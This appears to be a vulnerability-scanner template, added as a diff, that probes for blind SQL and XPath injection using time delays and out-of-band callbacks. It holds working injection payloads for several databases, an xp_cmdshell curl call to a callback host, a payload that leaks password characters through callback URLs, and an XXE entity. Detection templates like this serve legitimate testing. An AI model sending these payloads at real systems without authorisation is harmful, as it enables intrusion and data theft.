@@ -1,0 +1,268 @@
+id: time-based-correlation-sqli-xpath-oob
+
+info:
+  name: Time-Based Correlation SQLi and XPath Injection OOB
+  author: geeknik
+  severity: high
+  description: |
+    Detects blind SQL Injection and XPath Injection vulnerabilities using time delays
+    correlated with OOB callbacks for enhanced accuracy. Combines timing attacks with
+    database-triggered HTTP requests and XML parser-triggered external entity requests
+    with multi-database syntax support and systematic probe sequences.
+  reference:
+    - https://owasp.org/www-community/attacks/SQL_Injection
+    - https://owasp.org/www-community/attacks/XPath_Injection
+    - https://portswigger.net/web-security/sql-injection/blind
+    - https://book.hacktricks.xyz/pentesting-web/sql-injection
+    - https://book.hacktricks.xyz/pentesting-web/xpath-injection
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-89,CWE-643
+  tags: sqli,xpath,blind,time-based,correlation,oob,database,xml
+
+variables:
+  callback_url: "{{interactsh-url}}"
+  injection_id: "{{randstr}}"
+  delay_seconds: 5
+  time_oob_payload: |
+    # SQL Injection Time-Based with OOB Correlation
+
+    # MySQL Time-Based + OOB
+    1' OR (SELECT SLEEP({{delay_seconds}}) AND LOAD_FILE(CONCAT('http://{{callback_url}}/mysql-time-{{injection_id}}')) IS NOT NULL) --
+
+    # PostgreSQL Time-Based + OOB
+    1'; SELECT pg_sleep({{delay_seconds}}) WHERE (SELECT COUNT(*) FROM pg_stat_activity) > 0 AND CAST((SELECT version()) AS text) LIKE '%Post%' AND (SELECT dblink_connect('host={{callback_url}} dbname=test')) IS NOT NULL --
+
+    # MSSQL Time-Based + OOB
+    1'; WAITFOR DELAY '00:00:0{{delay_seconds}}'; DECLARE @url VARCHAR(1000) = 'http://{{callback_url}}/mssql-time-{{injection_id}}'; EXEC master.dbo.xp_cmdshell 'curl ' + @url --
+
+    # Oracle Time-Based + OOB
+    1' OR (SELECT COUNT(*) FROM v$session WHERE ROWNUM=1 AND (SELECT utl_http.request('http://{{callback_url}}/oracle-time-{{injection_id}}') FROM dual) IS NOT NULL AND DBMS_LOCK.SLEEP({{delay_seconds}}) IS NULL) > 0 --
+
+    # SQLite Time-Based + OOB (Limited)
+    1' OR (SELECT CASE WHEN (SELECT COUNT(*) FROM sqlite_master) > 0 THEN (SELECT load_extension('http://{{callback_url}}/sqlite-time-{{injection_id}}')) ELSE 0 END) --
+
+    # XPath Injection Time-Based + OOB
+
+    # XPath with XXE and Time Delay
+    test')] | //user[position()=1 and string-length(name())>0 and doc('http://{{callback_url}}/xpath-time-{{injection_id}}') and (1=1)][/*[local-name()='xml'][1]
+
+    # XPath Boolean + Time + OOB
+    test') or (count(//user)>0 and doc('http://{{callback_url}}/xpath-bool-{{injection_id}}')) and '1'='1
+
+    # XPath String Extraction + OOB
+    test') or substring(//user[1]/password,1,1)='a' and doc(concat('http://{{callback_url}}/xpath-extract-',substring(//user[1]/password,1,5),'-{{injection_id}}')) and '1'='1
+
+    # XPath Node Count + OOB
+    test') or count(//*)>10 and doc(concat('http://{{callback_url}}/xpath-count-',count(//user),'-{{injection_id}}')) and '1'='1
+
+    # Advanced SQL Time-Based Techniques
+
+    # MySQL Heavy Query + OOB
+    1' OR (SELECT COUNT(*) FROM information_schema.tables t1, information_schema.tables t2, information_schema.tables t3) > 1000000 AND (SELECT LOAD_FILE(CONCAT('http://{{callback_url}}/mysql-heavy-{{injection_id}}')) IS NOT NULL) --
+
+    # PostgreSQL Recursive CTE + OOB
+    1'; WITH RECURSIVE r(i) AS (VALUES(1) UNION ALL SELECT i+1 FROM r WHERE i < 1000000) SELECT i FROM r WHERE (SELECT COUNT(*) FROM r) > 0 AND (SELECT dblink_connect('host={{callback_url}} dbname=heavy-{{injection_id}}')) IS NOT NULL --
+
+    # Union-Based Time + OOB Combination
+    1' UNION SELECT SLEEP({{delay_seconds}}), LOAD_FILE('http://{{callback_url}}/union-time-{{injection_id}}'), 3 --
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      - "{{BaseURL}}/"
+      - "{{BaseURL}}/search"
+      - "{{BaseURL}}/login"
+      - "{{BaseURL}}/user"
+      - "{{BaseURL}}/product"
+      - "{{BaseURL}}/category"
+      - "{{BaseURL}}/xml"
+      - "{{BaseURL}}/xpath"
+
+    payloads:
+      param:
+        - "id"
+        - "user_id"
+        - "product_id"
+        - "category_id"
+        - "search"
+        - "q"
+        - "query"
+        - "filter"
+        - "xpath"
+        - "xml"
+
+    raw:
+      - |
+        GET {{path}}?{{param}}={{time_oob_payload}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Connection: close
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/search"
+      - "{{BaseURL}}/login"
+      - "{{BaseURL}}/api/search"
+      - "{{BaseURL}}/api/user"
+      - "{{BaseURL}}/api/product"
+      - "{{BaseURL}}/xml/query"
+      - "{{BaseURL}}/xpath/search"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    payloads:
+      param:
+        - "username"
+        - "email"
+        - "search"
+        - "query"
+        - "filter"
+        - "xpath"
+        - "xml_query"
+
+    body: "{{param}}={{time_oob_payload}}"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api"
+      - "{{BaseURL}}/api/search"
+      - "{{BaseURL}}/api/query"
+      - "{{BaseURL}}/graphql"
+
+    headers:
+      Content-Type: application/json
+      Accept: application/json
+
+    payloads:
+      field:
+        - "query"
+        - "search"
+        - "filter"
+        - "xpath"
+        - "xml_query"
+
+    body: |
+      {
+        "{{field}}": "{{time_oob_payload}}"
+      }
+
+  - method: PUT
+    path:
+      - "{{BaseURL}}/user"
+      - "{{BaseURL}}/profile"
+      - "{{BaseURL}}/config"
+
+    headers:
+      Content-Type: application/json
+
+    body: |
+      {
+        "filter": "{{time_oob_payload}}",
+        "xpath_query": "//user[name='{{time_oob_payload}}']",
+        "sql_where": "WHERE id = {{time_oob_payload}}"
+      }
+
+  - method: PATCH
+    path:
+      - "{{BaseURL}}/search/filter"
+      - "{{BaseURL}}/query/advanced"
+
+    headers:
+      Content-Type: application/json
+
+    body: |
+      {
+        "conditions": [
+          {
+            "field": "id",
+            "operator": "=",
+            "value": "{{time_oob_payload}}"
+          }
+        ],
+        "xpath": "//record[id='{{time_oob_payload}}']"
+      }
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/xml/parse"
+      - "{{BaseURL}}/xml/query"
+
+    headers:
+      Content-Type: application/xml
+
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE root [
+        <!ENTITY xxe SYSTEM "http://{{callback_url}}/xml-xxe-{{injection_id}}">
+      ]>
+      <root>
+        <query>{{time_oob_payload}}</query>
+        <xpath>//user[name='{{time_oob_payload}}']</xpath>
+        <xxe>&xxe;</xxe>
+      </root>
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= {{delay_seconds}}"
+        condition: and
+
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+        condition: or
+
+      - type: word
+        part: interactsh_request
+        words:
+          - "mysql-time-"
+          - "mysql-heavy-"
+          - "postgresql-time-"
+          - "mssql-time-"
+          - "oracle-time-"
+          - "sqlite-time-"
+          - "xpath-time-"
+          - "xpath-bool-"
+          - "xpath-extract-"
+          - "xpath-count-"
+          - "union-time-"
+          - "xml-xxe-"
+        condition: or
+
+    extractors:
+      - type: kval
+        part: interactsh_request
+        kval:
+          - interactsh_request
+        internal: true
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - "/(mysql|postgresql|mssql|oracle|sqlite|xpath|xml)-(time|heavy|bool|extract|count|xxe)-([a-z0-9A-Z]*)-([a-z0-9]+)"
+        group: 1,2,3,4
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - "/xpath-extract-([a-zA-Z0-9]+)-"
+        group: 1
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - "/xpath-count-([0-9]+)-"
+        group: 1
+
+      - type: dsl
+        dsl:
+          - "duration"
+        internal: true
